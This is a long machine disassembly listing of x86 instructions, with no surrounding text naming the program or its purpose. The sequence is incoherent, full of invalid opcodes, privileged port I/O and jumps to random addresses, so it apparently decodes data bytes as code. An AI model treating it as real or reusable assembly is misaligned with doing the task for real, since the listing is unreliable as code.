  4064b1:	push   0x22b63cb
  4064b6:	sbb    eax,0x861b5923
  4064bb:	dec    ecx
  4064bc:	(bad)  
  4064bd:	in     al,0x9a
  4064bf:	mov    ds:0x773e224c,eax
  4064c4:	cs jns 0x40648b
  4064c7:	inc    esi
  4064c8:	xchg   ebx,eax
  4064c9:	pop    ebp
  4064ca:	cli    
  4064cb:	rol    DWORD PTR [esi],cl
  4064cd:	paddw  mm0,QWORD PTR [eax]
  4064d0:	xchg   BYTE PTR [ebp-0x45],dh
  4064d3:	adc    eax,0x8a7de9e0
  4064d8:	inc    ebp
  4064d9:	(bad)  
  4064da:	stc    
  4064db:	je     0x406533
  4064dd:	cmp    eax,0x70b334da
  4064e2:	(bad)  
  4064e3:	jg     0x4064dc
  4064e5:	xor    eax,0x56bf4383
  4064ea:	or     eax,0xae71c584
  4064ef:	repnz clc 
  4064f1:	jnp    0x4064b0
  4064f3:	xchg   esp,eax
  4064f4:	cmp    eax,DWORD PTR [ebp-0xeff9d93]
  4064fa:	sahf   
  4064fb:	push   esp
  4064fc:	enter  0xa607,0xc0
  406500:	mov    edx,0x44dd6814
  406505:	sbb    DWORD PTR [esi-0x2],eax
  406508:	not    BYTE PTR [edx]
  40650a:	scas   al,BYTE PTR es:[edi]
  40650b:	frstor [edx+0x0]
  40650e:	inc    esi
  40650f:	push   ss
  406510:	mov    al,ds:0xfc4c36d6
  406515:	call   0x7970e284
  40651a:	pop    eax
  40651b:	test   BYTE PTR [edi+edi*2],ah
  40651e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40651f:	aad    0x16
  406521:	imul   bp,WORD PTR [edi-0x1bada360],0x15
  406529:	mov    bh,BYTE PTR [edi+eax*8]
  40652c:	int3   
  40652d:	mov    ss,WORD PTR [eax]
  40652f:	rcl    DWORD PTR [esi+eiz*1+0x19],0x8a
  406534:	scas   eax,DWORD PTR es:[edi]
  406535:	and    BYTE PTR [edx+0x52],ah
  406538:	xor    DWORD PTR [ecx+0x74],0xffffffd1
  40653c:	add    ecx,DWORD PTR [ebx+0x72]
  40653f:	es daa 
  406541:	sub    ebp,DWORD PTR [eax]
  406543:	adc    DWORD PTR gs:[bx+di-0x7ddd],0x4f
  40654a:	ja     0x406508
  40654c:	fcomp  DWORD PTR [ebx+0x271bd183]
  406552:	mov    ds:0x8d4b6fa8,eax
  406557:	cmp    al,BYTE PTR [esi+0x45525023]
  40655d:	sbb    eax,0x56dbe02e
  406562:	and    eax,DWORD PTR [ebx-0x61]
  406565:	and    bh,BYTE PTR [edx]
  406567:	sbb    eax,0xb0dac72e
  40656c:	dec    ecx
  40656d:	pop    esp
  40656e:	mov    bl,0x6b
  406570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406571:	push   edx
  406572:	sbb    al,0x3c
  406574:	iret   
  406575:	push   esi
  406576:	nop
  406577:	inc    ebx
  406578:	pop    ecx
  406579:	not    BYTE PTR [edi-0x4a]
  40657c:	es into 
  40657e:	outs   dx,BYTE PTR ds:[esi]
  40657f:	loope  0x40650f
  406581:	jno    0x40656c
  406583:	mov    bl,BYTE PTR [ebp-0x36332a9e]
  406589:	les    eax,FWORD PTR [ecx]
  40658b:	in     eax,dx
  40658c:	test   eax,0x4045a28
  406591:	std    
  406592:	dec    ecx
  406593:	add    dl,dh
  406595:	aam    0x62
  406597:	rol    DWORD PTR [ecx-0x1d],cl
  40659a:	xchg   DWORD PTR [edi+0x25],esi
  40659d:	jns    0x406574
  40659f:	in     al,0x72
  4065a1:	adc    ecx,DWORD PTR [edx+0x22]
  4065a4:	or     al,0xfe
  4065a6:	pop    ds
  4065a7:	test   eax,0x2e79d932
  4065ac:	jbe    0x40652f
  4065ae:	pushf  
  4065af:	sti    
  4065b0:	test   eax,0xcfce6498
  4065b5:	sub    BYTE PTR [esi-0x5b741dea],ah
  4065bb:	pop    edi
  4065bc:	shl    DWORD PTR [ebp-0x4691848c],cl
  4065c2:	cmovp  esp,DWORD PTR [esi]
  4065c5:	mov    eax,0xc408b128
  4065ca:	mov    WORD PTR [ebx-0x56],fs
  4065cd:	shl    DWORD PTR [ecx+0x47ee0b69],0xdb
  4065d4:	das    
  4065d5:	push   0x4b
  4065d7:	arpl   WORD PTR [ebx-0x2dc68386],sp
  4065dd:	mov    BYTE PTR [ecx-0x792c77f1],dh
  4065e3:	stc    
  4065e4:	mov    esp,DWORD PTR [esi]
  4065e6:	cwde   
  4065e7:	xor    BYTE PTR [ecx-0x5461b102],ch
  4065ed:	das    
  4065ee:	imul   DWORD PTR [edi-0x49]
  4065f1:	dec    esp
  4065f2:	fs call 0xbe4b:0xa0d33b49
  4065fa:	mov    ebp,0x20c8875c
  4065ff:	adc    DWORD PTR [edx+0x44490614],edi
  406605:	xlat   BYTE PTR ds:[ebx]
  406606:	pop    ds
  406607:	int    0x2b
  406609:	loope  0x406620
  40660b:	push   edx
  40660c:	cmp    eax,0x720c5945
  406611:	pushf  
  406612:	sbb    DWORD PTR [ebx+0x19],esi
  406615:	pushf  
  406616:	mov    ah,BYTE PTR [ebx-0x22a45e2c]
  40661c:	or     DWORD PTR [esi+0x5de9f703],ebx
  406622:	imul   edx,eax,0x1e
  406625:	imul   ebp,DWORD PTR [ebx+0x489dff7a],0x56
  40662c:	inc    esi
  40662d:	sub    al,0x45
  40662f:	jne    0x4065d0
  406631:	aas    
  406632:	sbb    BYTE PTR [edx*1+0xf018da1],al
  406639:	sub    ch,BYTE PTR [esi+0x21]
  40663c:	stos   BYTE PTR es:[edi],al
  40663d:	mov    esp,0xb4470550
  406642:	push   es
  406643:	adc    DWORD PTR [edx+0x4d],esi
  406646:	scas   al,BYTE PTR es:[edi]
  406647:	add    eax,0xf2129675
  40664c:	or     edi,DWORD PTR [ebx+0x44c268b4]
  406652:	test   BYTE PTR [edi],dl
  406654:	cmp    dl,BYTE PTR [edi]
  406656:	sbb    esi,DWORD PTR [edx]
  406658:	pop    ss
  406659:	fstp   TBYTE PTR [edi]
  40665b:	out    0x18,al
  40665d:	gs nop ecx
  406661:	and    al,0x5b
  406663:	push   0x4791caba
  406668:	leave  
  406669:	loopne 0x4065f0
  40666b:	shr    DWORD PTR [ebx],1
  40666d:	mov    cl,0xe
  40666f:	mov    al,cs:0x9ef47daf
  406675:	sub    cl,BYTE PTR [ebp+0x5e]
  406678:	es js  0x4066a8
  40667b:	sti    
  40667c:	enter  0x6ae9,0xd5
  406680:	sbb    DWORD PTR [ecx],esp
  406682:	scas   eax,DWORD PTR es:[edi]
  406683:	mov    cl,0x7d
  406685:	jbe    0x406608
  406687:	pop    edi
  406688:	(bad)  
  406689:	ja     0x406649
  40668b:	cld    
  40668c:	iret   
  40668d:	cmp    dh,0xd0
  406690:	jge    0x406653
  406692:	or     al,ah
  406694:	in     eax,dx
  406695:	push   ss
  406696:	in     eax,0x1b
  406698:	push   esp
  406699:	mov    ch,0xc7
  40669b:	ret    0x5b98
  40669e:	das    
  40669f:	arpl   bx,sp
  4066a1:	dec    ecx
  4066a2:	pop    ebx
  4066a3:	mov    eax,ds:0x2f2e877b
  4066a8:	retf   
  4066a9:	and    esp,DWORD PTR [eax+0x60]
  4066ac:	or     al,0x8
  4066ae:	idiv   DWORD PTR [ecx]
  4066b0:	cmp    al,0xa7
  4066b2:	je     0x4066b2
  4066b4:	stos   BYTE PTR es:[edi],al
  4066b5:	retf   0x22ed
  4066b8:	in     al,0x4f
  4066ba:	je     0x406700
  4066bc:	cmc    
  4066bd:	and    eax,0x9356ccee
  4066c2:	arpl   WORD PTR [ebp-0x7cf5d709],di
  4066c8:	outs   dx,BYTE PTR ds:[esi]
  4066c9:	mov    cs,WORD PTR [esi+0x5e16c578]
  4066cf:	iret   
  4066d0:	jmp    0x1e5d3988
  4066d5:	jl     0x40671c
  4066d7:	dec    esp
  4066d8:	test   BYTE PTR [edx+0x19],0x9e
  4066dc:	or     DWORD PTR [ebp+0x2b794c02],0x66b90e1f
  4066e6:	loope  0x406705
  4066e8:	jae    0x40669d
  4066ea:	in     al,0x76
  4066ec:	loope  0x406723
  4066ee:	ficom  DWORD PTR [esi-0x66]
  4066f1:	cmp    bl,BYTE PTR [eax+ecx*8]
  4066f4:	and    esi,DWORD PTR [edi]
  4066f6:	sub    eax,0xe7a629bd
  4066fb:	mov    DWORD PTR [edi+ecx*1],ebp
  4066fe:	mov    ah,0x2
  406700:	gs jmp 0x2cfd:0xc688a9cd
  406708:	popf   
  406709:	aas    
  40670a:	sbb    esi,DWORD PTR [ecx+eiz*4]
  40670d:	test   DWORD PTR [esi],ecx
  40670f:	(bad)  
  406710:	out    dx,eax
  406711:	push   edi
  406712:	lods   al,BYTE PTR ds:[esi]
  406713:	mov    cl,0xf0
  406715:	outs   dx,DWORD PTR ds:[esi]
  406716:	mov    ebx,0x26c73b9c
  40671b:	repz adc eax,0xa18f7b3a
  406721:	pop    ebx
  406722:	pop    esi
  406723:	push   0xd3b6d65d
  406728:	inc    esp
  406729:	sub    BYTE PTR [esp+ecx*8],ch
  40672c:	mov    esi,0xab4c9eb
  406731:	xlat   BYTE PTR ds:[ebx]
  406732:	mov    eax,ds:0xcbd916f
  406737:	xor    ebp,DWORD PTR [edi]
  406739:	repz int 0xcf
  40673c:	push   0xffffffb1
  40673e:	loope  0x406700
  406740:	in     eax,dx
  406741:	jmp    0x55205b27
  406746:	jg     0x40679c
  406748:	push   edx
  406749:	scas   al,BYTE PTR es:[edi]
  40674a:	push   cs
  40674b:	and    cl,BYTE PTR [edx+0x41]
  40674e:	retf   
  40674f:	or     BYTE PTR [ebx-0x30],0x69
  406753:	push   bx
  406755:	aam    0xa
  406757:	aaa    
  406758:	stos   DWORD PTR es:[edi],eax
  406759:	or     al,0xb
  40675b:	scas   eax,DWORD PTR es:[edi]
  40675c:	xor    BYTE PTR [edx+0x661a850a],0xc3
  406763:	sub    esi,eax
  406765:	fs enter 0x839f,0x60
  40676a:	loop   0x406778
  40676c:	sahf   
  40676d:	and    DWORD PTR [ebp+0x31a131d4],esp
  406773:	or     ch,BYTE PTR [edx+0x53]
  406776:	pushf  
  406777:	outs   dx,DWORD PTR ds:[esi]
  406778:	push   0x1d
  40677a:	rcr    BYTE PTR [edi+0x60],1
  40677d:	sar    BYTE PTR [ecx+0x33fd592d],1
  406783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406784:	test   BYTE PTR [edi],ah
  406786:	push   ds
  406787:	jae    0x4067c2
  406789:	or     DWORD PTR [eax-0x5f43e32b],edi
  40678f:	or     al,0xaf
  406791:	jo     0x4067d7
  406793:	or     ch,bh
  406795:	in     eax,0x8
  406797:	mov    edx,0xe3540982
  40679c:	mov    eax,ds:0xd8c4b88b
  4067a1:	pop    ebx
  4067a2:	in     al,dx
  4067a3:	sar    ah,1
  4067a5:	lods   al,BYTE PTR ds:[esi]
  4067a6:	jecxz  0x406819
  4067a8:	or     edx,ecx
  4067aa:	fcomp  QWORD PTR [ecx+0x41cfd9d9]
  4067b0:	test   al,0x4e
  4067b2:	(bad)  [ecx+0x12]
  4067b5:	dec    edx
  4067b6:	pushf  
  4067b7:	jno    0x40680b
  4067b9:	lea    esi,[edi+0x70]
  4067bc:	jle    0x4067ab
  4067be:	mov    bl,0x59
  4067c0:	ins    DWORD PTR es:[edi],dx
  4067c1:	nop
  4067c2:	aaa    
  4067c3:	xor    cl,BYTE PTR [ecx+0x28a7f872]
  4067c9:	push   ecx
  4067ca:	jns    0x40677e
  4067cc:	js     0x40678c
  4067ce:	push   0xb7f93ef1
  4067d3:	(bad)  
  4067d5:	push   esp
  4067d6:	mov    esp,0x976098f1
  4067db:	inc    edx
  4067dc:	ror    edx,cl
  4067de:	push   eax
  4067df:	mov    eax,esp
  4067e1:	and    al,BYTE PTR [ecx-0x21]
  4067e4:	mov    ds:0xe9739e04,al
  4067e9:	imul   ebx,DWORD PTR [edx-0x76],0xffffff90
  4067ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ee:	cmp    BYTE PTR [ebp+0x42],bh
  4067f1:	out    0x20,al
  4067f3:	dec    ecx
  4067f4:	into   
  4067f5:	adc    al,0xc0
  4067f7:	lds    ebp,FWORD PTR [ebp-0x2d]
  4067fa:	sub    BYTE PTR [ebx+esi*8],ah
  4067fd:	dec    eax
  4067fe:	add    bl,dh
  406800:	adc    al,0xa
  406802:	fidiv  DWORD PTR [edx-0x188c9c8d]
  406808:	dec    esp
  406809:	xlat   BYTE PTR ds:[ebx]
  40680a:	adc    esi,DWORD PTR [esi+0x1b]
  40680d:	mov    al,ds:0xab609b86
  406812:	out    0xeb,eax
  406814:	lock and BYTE PTR [esi+0x59],0xee
  406819:	adc    DWORD PTR [esi+ebp*4+0x1cf58c25],eax
  406820:	jp     0x40680b
  406822:	add    DWORD PTR [ecx+0x2ac3e0d6],eax
  406828:	sbb    BYTE PTR [ecx+0x1d],cl
  40682b:	xchg   BYTE PTR [edi-0x59225cee],dh
  406831:	jno    0x406888
  406833:	or     BYTE PTR [edx-0x6a7126f5],dl
  406839:	mov    ah,BYTE PTR [edi]
  40683b:	mov    eax,ds:0xbda869
  406840:	jb     0x406809
  406842:	mov    bh,ch
  406844:	cmp    edx,DWORD PTR [edi+0x7]
  406847:	xchg   esi,eax
  406848:	cli    
  406849:	pop    ecx
  40684a:	addr16 mov edx,0x73fb11a9
  406850:	int3   
  406851:	cs push ebx
  406853:	push   esp
  406854:	xchg   edx,eax
  406855:	pop    esp
  406856:	out    dx,eax
  406857:	add    al,BYTE PTR [ebx+ebx*1-0x114b903b]
  40685e:	dec    eax
  40685f:	inc    edx
  406860:	push   ss
  406861:	adc    BYTE PTR [ebx+0xa8d5ee6],cl
  406867:	popa   
  406868:	daa    
  406869:	add    BYTE PTR [edx-0x57],ch
  40686c:	in     eax,dx
  40686d:	aam    0xa5
  40686f:	xlat   BYTE PTR ds:[ebx]
  406870:	ins    DWORD PTR es:[edi],dx
  406871:	ror    edx,1
  406873:	xchg   esp,eax
  406874:	xchg   edx,eax
  406875:	in     eax,0x2b
  406877:	and    al,0x33
  406879:	mov    ebx,0xeaf4ee1d
  40687e:	xchg   DWORD PTR [esi-0x2d5ab83b],edx
  406884:	lock xor BYTE PTR [eax-0x3ae46db],cl
  40688b:	sbb    DWORD PTR [eax],esp
  40688d:	(bad)  [edi]
  40688f:	out    0x61,al
  406891:	push   0x4b
  406893:	leave  
  406894:	ror    esp,cl
  406896:	fmul   DWORD PTR [eax+0x2aeee813]
  40689c:	xchg   esp,eax
  40689d:	fwait
  40689e:	scas   al,BYTE PTR es:[edi]
  40689f:	arpl   WORD PTR [eax-0x21],dx
  4068a2:	in     al,dx
  4068a3:	fidiv  DWORD PTR [edx+esi*1+0x35]
  4068a7:	lods   al,BYTE PTR ds:[esi]
  4068a8:	sub    BYTE PTR [ebx+edi*4+0x79b52f9b],dl
  4068af:	dec    esp
  4068b0:	fiadd  DWORD PTR [esi+0x75]
  4068b3:	nop
  4068b4:	jmp    0x2eb60ff0
  4068b9:	test   al,0x4e
  4068bb:	mov    ebp,0xf3ac4803
  4068c0:	sub    eax,0x626bf9d3
  4068c5:	outs   dx,DWORD PTR ds:[esi]
  4068c6:	ds gs push esp
  4068c9:	xor    BYTE PTR [eax+0x76],al
  4068cc:	ins    DWORD PTR es:[edi],dx
  4068cd:	dec    edx
  4068ce:	fwait
  4068cf:	inc    edx
  4068d0:	cmp    ecx,DWORD PTR [edi+0x27]
  4068d3:	sub    BYTE PTR [esi-0x3094a521],ah
  4068d9:	stos   DWORD PTR es:[edi],eax
  4068da:	bound  ecx,QWORD PTR [ebx+0x14]
  4068dd:	mov    ah,0x80
  4068df:	xchg   esp,eax
  4068e0:	shl    DWORD PTR [ebx-0x1c5b12e5],1
  4068e6:	xor    eax,0x85fc5321
  4068eb:	sub    BYTE PTR [ecx+0xf9bd8aa],dl
  4068f1:	mov    BYTE PTR [eax],al
  4068f3:	inc    edi
  4068f4:	jb     0x4068ae
  4068f6:	(bad)  
  4068f7:	in     eax,0x7
  4068f9:	pop    DWORD PTR [eax-0x16a82b63]
  4068ff:	sbb    eax,0x82b5173a
  406904:	push   ecx
  406905:	nop
  406906:	sub    eax,0x371406d6
  40690b:	sbb    BYTE PTR [ebx-0x58f1334a],cl
  406911:	lods   al,BYTE PTR ds:[esi]
  406912:	fidiv  WORD PTR [eax-0x9]
  406915:	inc    ebx
  406916:	jne    0x40694b
  406918:	mov    ah,cl
  40691a:	dec    eax
  40691b:	pop    eax
  40691c:	in     eax,0xc3
  40691e:	ja     0x40697e
  406920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406921:	push   ds
  406922:	mov    bh,0x53
  406924:	dec    edx
  406925:	lahf   
  406926:	scas   al,BYTE PTR es:[edi]
  406927:	pusha  
  406928:	lds    esp,FWORD PTR [esi]
  40692a:	xor    al,0x0
  40692c:	sar    BYTE PTR [ecx+0x358e6179],0xc1
  406933:	pop    ss
  406934:	ds xchg edx,eax
  406936:	pop    ss
  406937:	push   edi
  406938:	and    DWORD PTR [eax+0xa],edx
  40693b:	sbb    al,0x55
  40693d:	and    BYTE PTR [edi],cl
  40693f:	call   0xd5704cdd
  406944:	mov    edi,ds
  406946:	pop    ebp
  406947:	xchg   ebp,eax
  406948:	mov    BYTE PTR [edx+edi*4],bh
  40694b:	or     bh,dl
  40694d:	in     eax,dx
  40694e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40694f:	mov    dh,bl
  406951:	or     cl,BYTE PTR [edi+eiz*2+0x29ebbfdd]
  406958:	fdivr  st,st(5)
  40695a:	in     eax,dx
  40695b:	jl     0x40699d
  40695d:	pop    es
  40695e:	add    dl,dh
  406960:	inc    edx
  406961:	cli    
  406962:	mov    ds:0x6dff49,al
  406967:	arpl   WORD PTR [ebx-0x6],bx
  40696a:	dec    edx
  40696b:	popa   
  40696c:	adc    ah,ch
  40696e:	push   esp
  40696f:	sub    DWORD PTR [esi-0x31694233],0xffffffd5
  406976:	ret    0x28c1
  406979:	cmp    DWORD PTR [esi-0x174e18f2],0xf15f8ec2
  406983:	xchg   ebx,eax
  406984:	add    eax,0x7af0c42d
  406989:	pop    ds
  40698a:	test   eax,0xd3a01881
  40698f:	or     eax,0x319caaf1
  406994:	push   es
  406995:	leave  
  406996:	push   ebx
  406997:	sub    BYTE PTR [esi+0x5e],ch
  40699a:	push   ecx
  40699b:	ss push eax
  40699d:	add    al,BYTE PTR [ebp-0x450ca84b]
  4069a3:	and    BYTE PTR [eax+edx*1],al
  4069a6:	pop    edi
  4069a7:	call   0x635c:0x848b9640
  4069ae:	sbb    DWORD PTR [eax],edi
  4069b0:	fld    DWORD PTR [ebx-0x45]
  4069b3:	pop    es
  4069b4:	pop    edi
  4069b5:	mov    eax,0x7b0c68b8
  4069ba:	cwde   
  4069bb:	sub    ah,BYTE PTR [ecx-0x5b2162e3]
  4069c1:	repz and ebp,ecx
  4069c4:	or     cl,BYTE PTR [edi]
  4069c6:	sti    
  4069c7:	sti    
  4069c8:	mov    bl,0x36
  4069ca:	fidivr DWORD PTR [esp+esi*2-0x4f]
  4069ce:	mov    ds:0x2e6c4073,eax
  4069d3:	inc    esi
  4069d4:	mov    fs,WORD PTR [edx]
  4069d6:	xor    BYTE PTR [edi-0x25],al
  4069d9:	test   BYTE PTR fs:[esi-0x42242ff9],al
  4069e0:	fs mov eax,0x98aeea9f
  4069e6:	xchg   esi,eax
  4069e7:	or     eax,0x2bfd7994
  4069ec:	ds (bad) 
  4069ee:	leave  
  4069ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069f0:	cwde   
  4069f1:	inc    ebp
  4069f2:	repz out 0x40,al
  4069f5:	xchg   esp,eax
  4069f6:	sub    DWORD PTR [eax+eax*4],edi
  4069f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069fa:	push   ebp
  4069fb:	lods   eax,DWORD PTR ds:[esi]
  4069fc:	mov    dl,0x1d
  4069fe:	sar    dl,0xae
  406a01:	in     eax,0xc
  406a03:	xchg   edx,eax
  406a04:	add    DWORD PTR [esi-0x72],eax
  406a07:	sub    al,0x5
  406a09:	or     edi,DWORD PTR ss:[edi+0x5c]
  406a0d:	imul   esp,DWORD PTR [ecx+esi*8+0x51],0x80e47868
  406a15:	push   eax
  406a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a17:	xlat   BYTE PTR ds:[ebx]
  406a18:	fcomi  st,st(0)
  406a1a:	out    dx,al
  406a1b:	cwde   
  406a1c:	mov    es,WORD PTR [ebx+edi*1+0x17689bf4]
  406a23:	jbe    0x406a66
  406a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a26:	sbb    BYTE PTR [edx+0x54e21a64],bl
  406a2c:	or     eax,0x2ea4248
  406a31:	je     0x406a55
  406a33:	mov    ds:0x26e3a039,eax
  406a38:	adc    dh,BYTE PTR [ebx]
  406a3a:	push   ss
  406a3b:	xor    al,BYTE PTR [ebx+0x74]
  406a3e:	dec    ebx
  406a3f:	popa   
  406a40:	fidiv  DWORD PTR [edi]
  406a42:	mov    ch,0xa1
  406a44:	xchg   edx,eax
  406a45:	outs   dx,BYTE PTR ds:[esi]
  406a46:	or     eax,0x30d2af65
  406a4b:	xchg   esi,eax
  406a4c:	cmp    DWORD PTR [ebx+0x51],edi
  406a4f:	mov    edi,esp
  406a51:	ja     0x406a0c
  406a53:	outs   dx,DWORD PTR ds:[esi]
  406a54:	fnsave ds:0xc82e69
  406a5a:	arpl   WORD PTR ds:0xfa485a17,bx
  406a60:	inc    eax
  406a61:	inc    ecx
  406a62:	cmp    eax,0xb4da0d25
  406a67:	je     0x406a8f
  406a69:	pop    ebx
  406a6a:	mov    ah,0xfc
  406a6c:	outs   dx,BYTE PTR ds:[esi]
  406a6d:	and    BYTE PTR [ebx],0xb1
  406a70:	mov    BYTE PTR [edx-0x5594d6cc],dh
  406a76:	test   edi,esi
  406a78:	test   DWORD PTR [edx+0x6af528d4],ebx
  406a7e:	std    
  406a7f:	mov    esi,0x6c0e9ef3
  406a84:	sub    DWORD PTR [edx],edi
  406a86:	loopne 0x406a7d
  406a88:	fcom   st(5)
  406a8a:	(bad)  
  406a8b:	sbb    DWORD PTR [ecx],ebx
  406a8d:	fist   DWORD PTR [ebp+0x3e165ef6]
  406a93:	lods   eax,DWORD PTR ds:[esi]
  406a94:	mov    gs:0x291aa574,eax
  406a9a:	mov    eax,ss
  406a9c:	mov    ebx,0x4f05ac00
  406aa1:	lods   eax,DWORD PTR ds:[esi]
  406aa2:	jmp    0x65e075c2
  406aa7:	mov    ebp,0xd18fa0d9
  406aac:	adc    DWORD PTR [esi+0x46a8f0f2],eax
  406ab2:	arpl   WORD PTR [edx-0x2d3807df],di
  406ab8:	sti    
  406ab9:	sahf   
  406aba:	inc    edx
  406abb:	ins    DWORD PTR es:[edi],dx
  406abc:	mov    eax,ss:0x284f9a6a
  406ac2:	xchg   BYTE PTR [ebx],bl
  406ac4:	xchg   edi,eax
  406ac5:	sti    
  406ac6:	ret    
  406ac7:	cmp    DWORD PTR [esi-0x16],edx
  406aca:	xor    eax,0x5ade8726
  406acf:	aas    
  406ad0:	stos   DWORD PTR es:[edi],eax
  406ad1:	xor    DWORD PTR [eax-0x24bfa04c],ebx
  406ad7:	dec    ebx
  406ad8:	pop    ebx
  406ad9:	push   eax
  406ada:	(bad)  
  406adb:	in     eax,0x73
  406add:	das    
  406ade:	cdq    
  406adf:	mov    edi,0xd46543f9
  406ae4:	fdivr  DWORD PTR [edx+eiz*1]
  406ae7:	add    ah,BYTE PTR [edx]
  406ae9:	push   edx
  406aea:	shr    DWORD PTR [edx-0x16ca1599],cl
  406af0:	add    BYTE PTR [ebx+esi*8+0x3c361984],cl
  406af7:	nop
  406af8:	sub    esi,DWORD PTR [ebx+0x4f]
  406afb:	add    al,0xff
  406afd:	(bad)  
  406afe:	push   edx
  406aff:	stc    
  406b00:	daa    
  406b01:	pushf  
  406b02:	mov    bp,0x3082
  406b06:	adc    esp,DWORD PTR [edi+eiz*4+0x5f]
  406b0a:	inc    esp
  406b0b:	jns    0x406ac3
  406b0d:	xchg   ecx,eax
  406b0e:	(bad)  
  406b0f:	call   0x6fd3:0x867be175
  406b16:	stc    
  406b17:	jg     0x406b16
  406b19:	push   ecx
  406b1a:	pop    ecx
  406b1b:	(bad)  
  406b1c:	shl    edi,cl
  406b1e:	test   al,0x8c
  406b20:	andps  xmm6,XMMWORD PTR [eax]
  406b23:	push   eax
  406b24:	ret    0x649f
  406b27:	fs push es
  406b29:	or     ebp,edx
  406b2b:	jae    0x406b09
  406b2d:	dec    edx
  406b2e:	push   ebx
  406b2f:	daa    
  406b30:	into   
  406b31:	add    al,0x20
  406b33:	mov    al,ds:0xe8655683
  406b38:	lock aad 0xf4
  406b3b:	cmp    edx,ebx
  406b3d:	mov    DWORD PTR [ebx+0x573644d6],ebx
  406b43:	shr    BYTE PTR [esi],1
  406b45:	ins    BYTE PTR es:[edi],dx
  406b46:	push   ecx
  406b47:	inc    ebx
  406b48:	imul   esp,edx,0xfffffffb
  406b4b:	aam    0x76
  406b4d:	xchg   edi,eax
  406b4e:	and    DWORD PTR [ebx+0x56ec603c],ebx
  406b54:	push   ebp
  406b55:	add    edx,eax
  406b57:	add    cl,ch
  406b59:	repnz loop 0x406ba2
  406b5c:	push   0x201e6f61
  406b61:	int    0x86
  406b63:	ins    DWORD PTR es:[edi],dx
  406b64:	loopne 0x406b91
  406b66:	mov    BYTE PTR [esp+ebx*8],bl
  406b69:	ror    BYTE PTR [ecx],1
  406b6b:	int    0xec
  406b6d:	out    0x31,eax
  406b6f:	mov    ebp,0xf484aab5
  406b74:	fld    st(6)
  406b76:	mov    dl,0xbe
  406b78:	ret    0x25af
  406b7b:	jb     0x406b27
  406b7d:	aam    0x65
  406b7f:	cwde   
  406b80:	in     al,0xbe
  406b82:	jmp    0x8702:0xb782e4e7
  406b89:	mov    al,0xee
  406b8b:	ret    
  406b8c:	gs js  0x406bdd
  406b8f:	xor    al,cl
  406b91:	pusha  
  406b92:	cdq    
  406b93:	mov    DWORD PTR [edx-0x4d],esp
  406b96:	adc    DWORD PTR [ecx],0x3b
  406b99:	test   al,0xd0
  406b9b:	mov    dh,0x85
  406b9d:	jg     0x406bcb
  406b9f:	ficom  DWORD PTR [edi+eiz*8+0x50]
  406ba3:	cmp    BYTE PTR [ecx+0x1b],0x8e
  406ba7:	es call 0xe4d8:0x50f5336b
  406baf:	jp     0x406b43
  406bb1:	out    dx,eax
  406bb2:	and    BYTE PTR [eax-0x2da00d95],ch
  406bb8:	lds    dx,DWORD PTR ds:0x6ea8c881
  406bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bc0:	in     al,0x42
  406bc2:	ss enter 0x2b1a,0x3f
  406bc7:	cli    
  406bc8:	rcl    bh,0x93
  406bcb:	neg    BYTE PTR [ecx-0x25]
  406bce:	add    DWORD PTR [ebp+0x6e],0xffffffe8
  406bd2:	mov    al,0xb7
  406bd4:	in     eax,0x40
  406bd6:	pop    edx
  406bd7:	inc    edx
  406bd8:	adc    al,0x45
  406bda:	inc    ecx
  406bdb:	outs   dx,BYTE PTR ds:[esi]
  406bdc:	in     eax,dx
  406bdd:	jle    0x406c29
  406bdf:	mov    bh,0x58
  406be1:	mov    bl,0xc8
  406be3:	sub    esi,DWORD PTR [edx-0x58]
  406be6:	fwait
  406be7:	call   0xc325:0x2f9324b4
  406bee:	mov    ss,esi
  406bf0:	leave  
  406bf1:	(bad)  
  406bf3:	and    eax,0xe0fcd8
  406bf8:	add    DWORD PTR fs:[esi+0xd117b1a],ecx
  406bff:	adc    eax,0xe36a18c2
  406c04:	fisttp QWORD PTR [eax+0x201c5a09]
  406c0a:	pop    esp
  406c0b:	sbb    eax,DWORD PTR [edx-0x74]
  406c0e:	or     DWORD PTR [ebx],ebx
  406c10:	or     eax,edi
  406c12:	pop    es
  406c13:	in     eax,dx
  406c14:	mov    ebp,0x75f04997
  406c19:	and    al,0xb6
  406c1b:	scas   eax,DWORD PTR es:[edi]
  406c1c:	mov    BYTE PTR gs:[edx-0x4c],bl
  406c20:	repnz sbb BYTE PTR [esi-0xe],dl
  406c24:	or     BYTE PTR [esi],0xfa
  406c27:	daa    
  406c28:	mov    ebx,0x6dec4091
  406c2d:	jle    0x406bba
  406c2f:	ins    DWORD PTR es:[edi],dx
  406c30:	jo     0x406bd7
  406c32:	call   0x668b:0x451a5dcd
  406c39:	sti    
  406c3a:	dec    esp
  406c3b:	stos   DWORD PTR es:[edi],eax
  406c3c:	xchg   ebx,eax
  406c3d:	fwait
  406c3e:	pusha  
  406c3f:	(bad)  
  406c40:	mov    ah,0x14
  406c42:	out    0xa5,eax
  406c44:	jl     0x406c5f
  406c46:	jecxz  0x406c47
  406c48:	add    esi,DWORD PTR [ecx]
  406c4a:	cmp    ecx,ebx
  406c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c4d:	adc    eax,0x2d0c1ff1
  406c52:	xchg   dh,dl
  406c54:	xlat   BYTE PTR ds:[ebx]
  406c55:	out    dx,al
  406c56:	jnp    0x406c42
  406c58:	cli    
  406c59:	mov    dh,0xd3
  406c5b:	sbb    BYTE PTR ds:0x280fce58,0xe2
  406c62:	(bad)  
  406c63:	sti    
  406c64:	loope  0x406c83
  406c66:	cmp    esi,DWORD PTR [ebp-0x70176d80]
  406c6c:	clc    
  406c6d:	sar    DWORD PTR [ebx+0x14],cl
  406c70:	pop    ebp
  406c71:	xor    BYTE PTR [ebx-0x2c],cl
  406c74:	inc    edx
  406c75:	fcom   DWORD PTR [ebx]
  406c77:	aam    0x97
  406c79:	js     0x406cab
